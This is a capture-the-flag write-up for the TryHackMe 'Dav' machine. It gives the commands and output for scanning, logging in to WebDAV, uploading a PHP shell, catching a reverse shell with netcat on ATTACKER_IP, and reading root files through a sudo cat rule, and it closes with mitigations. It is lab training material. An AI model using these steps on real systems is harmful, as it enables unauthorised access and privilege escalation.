# TryHackMe - Dav Machine Writeup

**Room Link**: [Dav on TryHackMe](https://tryhackme.com/r/room/dav)

## Machine Information
- **Machine Name**: Dav
- **Difficulty**: Easy
- **IP Address**: ||MACHINE_IP||

---

## Reconnaissance

### Nmap Scan
First, let's scan the target machine to identify open ports and services:

```bash
nmap -sV -sC MACHINE_IP
```

**Results:**
- **Port 80**: Apache httpd 2.4.18 (Ubuntu)
  - Default Apache2 Ubuntu page

```
Nmap scan report for MACHINE_IP
Host is up (0.077s latency).
Not shown: 999 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.18 (Ubuntu)
```

### Directory Enumeration

Performed directory scanning with different wordlists:

```bash
gobuster dir -u http://MACHINE_IP -w /usr/share/wordlists/dirb/big.txt
```

**Discovered directories:**
- `/.htaccess` (Status: 403)
- `/.htpasswd` (Status: 403)
- `/server-status` (Status: 403)
- `/webdav` (Status: 401) ← **Authentication Required**

---

## Exploitation

### WebDAV Discovery
The `/webdav` directory requires authentication. WebDAV (Web Distributed Authoring and Versioning) is a protocol that extends HTTP to allow remote file management.

### WebDAV Access
Used `cadaver` (WebDAV client) to connect to the service:

```bash
cadaver http://MACHINE_IP/webdav/
```

**Successful login:**
- Username: `||USERNAME||`
- Password: `||PASSWORD||`

**Connected successfully to WebDAV:**
```bash
dav:/webdav/> ls
Listing collection `/webdav/': succeeded.
        passwd.dav                            44  Aug 26  2019
```

### Remote File Upload & RCE

Successfully uploaded a PHP shell to the WebDAV directory:

```bash
dav:/webdav/> put shell.php
Uploading shell.php to `/webdav/shell.php':
Progress: [=============================>] 100.0% of 5494 bytes succeeded.
```

The shell is now accessible at: `http://MACHINE_IP/webdav/shell.php`

Accessing the shell via netcat listener:

```bash
nc -lvnp 1234
listening on [any] 1234 ...
connect to [ATTACKER_IP] from (UNKNOWN) [10.112.158.31] 60888
```

---

## Privilege Escalation

### Initial Shell Access
Connected to the target as `www-data` user:

```bash
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

### Checking Sudo Privileges
Checked available sudo commands:

```bash
$ sudo -l
Matching Defaults entries for www-data on ubuntu:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/usr/sbin\:/bin\:/snap/bin

User www-data may run the following commands on ubuntu:
    (ALL) NOPASSWD: /bin/cat
```

The `www-data` user can run `/bin/cat` as root without a password!

### Finding the User Flag
Located the user flag in the home directory:

```bash
$ cd /home/merlin
$ ls
user.txt
$ cat user.txt
||USER_FLAG||
```

### Finding the Root Flag
Leveraged the `/bin/cat` sudo privilege to read the root flag:

```bash
$ sudo /bin/cat /root/root.txt
||ROOT_FLAG||
```

---

## Flags

### Flag 1: User Flag
> ||USER_FLAG||

### Flag 2: Root Flag  
> ||ROOT_FLAG||

---

## Key Takeaways

1. **WebDAV Misconfiguration**: Service exposed with insufficient access controls
2. **Weak Credentials**: Credentials were accepted for access
3. **File Upload Vulnerability**: WebDAV allowed uploading executable PHP files
4. **Remote Code Execution**: Uploaded PHP shell provides shell access to the system
5. **Sudo Misconfiguration**: Excessive sudo privileges allowed privilege escalation
6. **Importance of Enumeration**: Directory scanning revealed the vulnerable `/webdav` endpoint

---

## Mitigation

- Disable WebDAV if not required
- Use strong, unique credentials
- Implement proper access controls and authentication
- Restrict file upload types
- Monitor WebDAV access logs
- **Principle of Least Privilege**: Limit sudo access to only necessary commands
- Use `sudo` with specific command restrictions and arguments

---

## Tools Used
- `nmap` - Network reconnaissance
- `gobuster` - Directory enumeration  
- `cadaver` - WebDAV client
- `nc` (netcat) - Reverse shell listener

---

**Writeup completed on**: 2026-06-01
**Machine Status**: ✓ Pwned
